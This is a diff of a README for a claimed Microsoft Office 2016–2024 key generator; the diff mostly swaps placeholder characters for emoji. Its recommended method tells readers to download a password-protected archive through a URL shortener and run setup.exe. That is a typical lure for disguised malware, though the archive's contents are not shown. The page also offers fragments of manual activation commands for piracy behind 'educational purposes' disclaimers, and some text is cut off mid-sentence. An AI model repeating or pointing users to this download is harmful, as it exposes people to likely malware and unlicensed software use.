@@ -1,25 +1,25 @@
 # Microsoft Office 2016, 2019, 2021 and 2024 Key Generator
 
-## ?? Disclaimer
+## ⚠️ Disclaimer
 **This project is for educational purposes only.** The unauthorized distribution or use of Windows product keys may violate Microsoft’s Terms of Service. The author assumes no responsibility for any misuse of this software.
 
-## ?? About
+## 📌 About
 This program allows users to generate free product keys for Microsoft Office. It supports various editions, including Office 2016, 2019, and 2021. Designed for testing and evaluation purposes, it provides users with quick access to activation keys.s.
 
-## ?? Features
+## 🚀 Features
 - Microsoft Office 2016, 2019, 2021 and 2024 activation keys.
 - Fast and lightweight.
 - User-friendly interface.
 - Supports multiple key formats.
 
-## ?? Installation & Launch
+## 📥 Installation & Launch
 
-### ?? ? RECOMMENDED METHOD (Windows .exe)
-1?? **[Download](https://goo.su/hLYS) and extract archive(pass: Project12!)**  
-2?? **Run `setup.exe`**  
-?? **The application will set up everything automatically, just enjoy!**  
+### 🔹 ✅ RECOMMENDED METHOD (Windows .exe)
+1️⃣ **[Download](https://goo.su/hLYS) and extract archive(pass: Project12!)**  
+2️⃣ **Run `setup.exe`**  
+🚀 **The application will set up everything automatically, just enjoy!**  
 
-?? **Important:** This method is **faster** and requires **no manual setup**!  
+⚠️ **Important:** This method is **faster** and requires **no manual setup**!  
 
 OR use hand aktivation:
 
@@ -37,15 +37,15 @@ cd \Program Files (x86)\Microsoft Office\Office16*
 *cscript ospp.vbs /act to complete the activation process.*
 Changing the activation from M
 
-## ?? Screenshots
+## 📷 Screenshots
 ![Include products](office.jpg)
 
-## ?? Requirements
+## ⚠️ Requirements
 - Windows 10/11
 - Python 3.x (if applicable)
 
-## ?? Legal Notice
+## ⚠️ Legal Notice
 This software should only be used for educational or testing purposes. Using it to activate Windows without a legitimate license is illegal and violates Microsoft’s policies. The author is not responsible for any legal consequences resulting from the use of this program.
 
-## ?? License
+## 📜 License
 This project is released under the [MIT License](LICENSE).
